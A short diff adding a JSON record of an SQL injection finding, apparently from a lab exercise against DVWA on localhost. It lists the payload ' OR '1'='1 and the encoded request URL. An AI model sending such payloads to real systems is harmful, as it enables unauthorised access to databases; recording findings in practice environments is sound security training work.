@@ -1,0 +1,5 @@
+{
+    "vulnerability": "SQL Injection",
+    "payload": "' OR '1'='1",
+    "url": "http://localhost/dvwa/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit"
+}
